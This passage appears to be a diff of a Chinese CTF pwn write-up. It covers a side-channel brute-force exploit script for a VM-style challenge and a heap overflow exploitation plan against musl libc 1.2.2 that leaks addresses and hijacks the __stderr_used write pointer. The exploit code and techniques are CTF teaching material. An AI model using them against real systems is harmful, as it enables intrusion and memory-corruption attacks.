+</span></span><span class="line"><span class="cl"><span class="n">create_file</span><span class="p">(</span><span class="s2">&#34;hack9&#34;</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_file</span><span class="p">(</span><span class="s2">&#34;hack9&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_file</span><span class="p">(</span><span class="s2">&#34;hack9&#34;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bye</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>调试截图：</p>
+<p>执行到<code>puts</code>：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425020256188.png' alt="image-20220425020256188"></p>
+<p>准备劫持<code>rsp</code>：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425020408980.png' alt="image-20220425020408980"></p>
+<p>栈迁移到堆上，修改其权限：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425020505028.png' alt="image-20220425020505028"></p>
+<p>切到<code>32</code>位：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425020603610.png' alt="image-20220425020603610"></p>
+<p>读取到<code>flag</code>：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425020657318.png' alt="image-20220425020657318"></p>
+<p>远程打：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425013729729.png' alt="image-20220425013729729"></p>
+<h2 class="heading-element" id="4-try2findme"><span>4 Try2findme</span>
+  <a href="#4-try2findme" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>逆向题，侧信道爆破即可。</p>
+<h3 class="heading-element" id="checksec-3"><span>Checksec</span>
+  <a href="#checksec-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425220349629.png' alt="image-20220425220349629"></p>
+<p>还开启了沙箱，不过不影响做题，<code>libc</code>的版本也不影响做题。</p>
+<h3 class="heading-element" id="题目分析"><span>题目分析</span>
+  <a href="#%e9%a2%98%e7%9b%ae%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>应该叫题目分析更为合适~</p>
+<p>首先用<code>IDA</code>恢复跳表：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425220954049.png' alt="image-20220425220954049"></p>
+<p>修复后好看多了：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426215711593.png' alt="image-20220426215711593"></p>
+<p>然后恢复结构体信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">Mgr</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint8_t</span> <span class="n">status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">lower_flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">equal_flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>初始化的地方需要注意一下：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425222305913.png' alt="image-20220425222305913"></p>
+<p>而<code>{</code>是<code>0x7b</code>，<code>}</code>是<code>0x7d</code>。</p>
+<p>总结各个分支的流程如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">case d[i]:
+</span></span><span class="line"><span class="cl">    0: ++i
+</span></span><span class="line"><span class="cl">    1: s[++p] = d[++i]
+</span></span><span class="line"><span class="cl">    2: --p
+</span></span><span class="line"><span class="cl">    3: s[p-1] = s[p] + s[p-1]
+</span></span><span class="line"><span class="cl">    4: s[p-1] = s[p] - s[p-1]
+</span></span><span class="line"><span class="cl">    5: s[p-1] = s[p] * s[p-1]
+</span></span><span class="line"><span class="cl">    6: s[p-1] = s[p] / s[p-1]
+</span></span><span class="line"><span class="cl">    7: ++i; i = d[i]
+</span></span><span class="line"><span class="cl">    8: ++i; if equal_flag; then i = d[i]
+</span></span><span class="line"><span class="cl">    0x9: ++i; if !equal_flag; then i = d[i]
+</span></span><span class="line"><span class="cl">    0xa: ++i; if equal_flag || lower_flag; then i = d[i]
+</span></span><span class="line"><span class="cl">    0xb: ++i; if !lower_flag; then i = d[i]
+</span></span><span class="line"><span class="cl">    0xc: ++i; if lower_flag; then i = d[i]
+</span></span><span class="line"><span class="cl">    0xd: equal_flag = (s[p] == s[p-1]); lower_flag = (s[p] &lt; s[p-1])
+</span></span><span class="line"><span class="cl">    0xe: s[p] = ~s[p]
+</span></span><span class="line"><span class="cl">    0xf: s[p-1] = s[p] &amp; s[p-1]
+</span></span><span class="line"><span class="cl">    0x10: s[p-1] = s[p] | s[p-1]
+</span></span><span class="line"><span class="cl">    0x11: s[p-1] = s[p] ^ s[p-1]
+</span></span><span class="line"><span class="cl">    0x12: sleep infinity
+</span></span><span class="line"><span class="cl">    other: exit
+</span></span><span class="line"><span class="cl">++i</span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞在于<code>i</code>的值可以由输入控制，而<code>i</code>又可以控制分支执行。因此，类似于汇编中的各类跳转分支，当控制了<code>i</code>之后，我们可以在各个分支之间跳转。</p>
+<h3 class="heading-element" id="利用思路-3"><span>利用思路</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>每个分支分析清楚之后，不难想到，可以用侧信道爆破。思路如下：</p>
+<ul>
+<li>由于初始化中的字节都是小于<code>0x7a</code>的，所以可以用<code>}</code>字符去判断是否找到了存放<code>flag</code>的位置。初始化：将<code>p</code>减小<code>0x60</code>，跳过管理的<code>chunk</code>和<code>0x30</code>个字节</li>
+<li>然后<code>case 1</code>，将<code>}</code>输入到<code>s[p]</code></li>
+<li>使用<code>case 0xd</code>判断前一个字符是否等于<code>}</code>，然后借助<code>case 8</code>和<code>case 9</code>分别进行跳转</li>
+<li>如果不等于，<code>p -= 2</code>，然后跳转到第二步重复；如果相等，说明找到<code>flag</code>的尾部了，跳转到下一步，猜测当前字符</li>
+<li><code>case 0xd</code>猜测当前字符，借助<code>case 8</code>和<code>case 9</code>分别进行跳转</li>
+<li>猜测成功的时候跳转到<code>case 0x12</code>，一直睡眠；猜测失败的时候跳转到<code>case other</code>，会输出<code>See u next time~</code></li>
+<li>使用当前方法爆破出所有字符即可</li>
+</ul>
+<h3 class="heading-element" id="exp-3"><span>EXP</span>
+  <a href="#exp-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;}&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x24</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">guess_char</span> <span class="ow">in</span> <span class="s2">&#34;0123456789-abcdef&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># reset</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">gift</span><span class="o">.</span><span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">gift</span><span class="o">.</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">gift</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">gift</span><span class="o">.</span><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">gift</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">gift</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">:</span><span class="s2">&#34;</span><span class="se">\x02</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x60</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x60</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\x01</span><span class="s2">}</span><span class="se">\x0d\x08\x6f\x09\x5d</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x70</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\x02</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="se">\x01</span><span class="si">{</span><span class="n">guess_char</span><span class="si">}</span><span class="se">\x0d\x08\xb0\x13</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0xb0</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\x12\x12</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">ra</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;See u next time&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">m</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="n">guess_char</span> <span class="o">+</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ic</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ic</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="n">log_ex</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log_ex</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>远程的环境没有了，在本地试了一下，很快就爆破出<code>flag</code>：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425223330187.png' alt="image-20220425223330187"></p>
+<h2 class="heading-element" id="5-storage"><span>5 Storage</span>
+  <a href="#5-storage" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>1.2.2 musl libc</code>的堆管理方式也没有特别的复杂，虽然与<code>1.1.24</code>版本的管理方式完全不同。理解了<code>meta/group/meta_area/malloc_context</code>几个结构体后，即可很快厘清堆管理方式。</p>
+<p>因此题目提供的了完备的增删改查功能，所以其实做本题甚至不需要完全搞懂<code>musl libc</code>的分配方式，只需要找到一个特殊的地址进行操作即可。关于<code>musl libc</code>的分析文章，可参考<a href="https://www.anquanke.com/post/id/246929"target="_blank" rel="external nofollow noopener noreferrer">这里<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>，写得很详细，建议边读边结合源码分析。</p>
+<p>自己编译源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git clone git@github.com:bminor/musl.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ./musl
+</span></span><span class="line"><span class="cl">git checkout v1.2.2
+</span></span><span class="line"><span class="cl"><span class="nv">CC</span><span class="o">=</span><span class="s2">&#34;gcc&#34;</span> <span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">&#34;-z now&#34;</span> ./configure --enable-debug --disable-werror
+</span></span><span class="line"><span class="cl">make -j7</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在<code>./musl/lib</code>中即可找到带调试信息的<code>libc.so</code></p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426220542281.png' alt="image-20220426220542281"></p>
+<h3 class="heading-element" id="checksec-4"><span>Checksec</span>
+  <a href="#checksec-4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426220610323.png' alt="image-20220426220610323"></p>
+<p><code>musl</code>版本为<code>1.2.2</code>。</p>
+<h3 class="heading-element" id="漏洞点-3"><span>漏洞点</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在<code>store</code>函数：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426220804228.png' alt="image-20220426220804228"></p>
+<p>其实一开始我注意到这个点，但是根据之前的经验，就是<a href="https://man7.org/linux/man-pages/man2/read.2.html"target="_blank" rel="external nofollow noopener noreferrer">这里<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>的描述：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426220938510.png' alt="image-20220426220938510"></p>
+<p>我以为<code>read</code>会直接返回，然后<code>ptr + 0xffffffff</code>这里将是一个无效的地址，赋值的时候段错误。后来找了半天没找到漏洞，然后试了一下这里，发现竟然没有报错，可以继续输入，真的很神奇&hellip;&hellip;所以，经验主义确实害人啊~</p>
+<p>既然这里可以溢出，那么利用就很简单了。</p>
+<h3 class="heading-element" id="利用思路-4"><span>利用思路</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af-4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>需要注意的是，<code>musl</code>分配的堆，除了属于动态内存区域，还可能属于静态内存区域。是因为<code>musl</code>在初始化的时候，会在<code>libc.so</code>映射的地址空间寻找未使用片段，然后当作静态内存管理起来。所以，可能分配到的堆地址是一个<code>libc</code>地址。</p>
+<p>首先观察到，程序一开始申请的<code>0x80</code>大小的<code>chunk</code>就在<code>libc</code>上：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426221510334.png' alt="image-20220426221510334"></p>
+<p>在<code>malloc(0)</code>的大小的内存也在<code>libc.so</code>的地址空间，而且恰好在这个<code>0x80</code>的<code>chunk</code>的上方：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426221811777.png' alt="image-20220426221811777"></p>
+<p>距离为<code>0x3f0</code>。也就是说，可以溢出修改<code>ptrs</code>中存储的指针。然后由于有个<code>\x00</code>的截断，所以需要寻找一个地址<code>x</code>，恰好在<code>x &amp; ~0xff</code>的地址处存储着<code>libc</code>地址或者堆地址，或者栈地址，满足一个即可。后来测试出来，<code>malloc(0x400)</code>的时候，满足需求：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426222103616.png' alt="image-20220426222103616"></p>
+<p>这里有个堆地址，然后堆地址上一定会有<code>libc</code>地址，因为会有<code>group</code>结构在<code>libc</code>上。</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426222219811.png' alt="image-20220426222219811"></p>
+<p>经过多次测试，这里的<code>libc</code>地址相对于基地址是固定的。</p>
+<p>总结以上利用思路为：</p>
+<ul>
+<li>
+<p><code>store(0x400)</code>准备好要利用的指针</p>
+</li>
+<li>
+<p><code>store(0xffffffff)</code>溢出修改<code>ptrs[0]</code>存储的指针的最低字节为<code>\x00</code></p>
+</li>
+<li>
+<p><code>show(0)</code>即可泄露堆地址</p>
+</li>
+<li>
+<p>继续溢出修改指针为堆地址，然后泄露<code>libc</code>地址</p>
+</li>
+<li>
+<p>计算得到<code>__stderr_used</code>地址，劫持其<code>write</code>函数指针，触发一个<code>exit</code>即可控制程序执行流</p>
+</li>
+</ul>
+<h3 class="heading-element" id="exp-4"><span>EXP</span>
+  <a href="#exp-4" class="heading-mark">
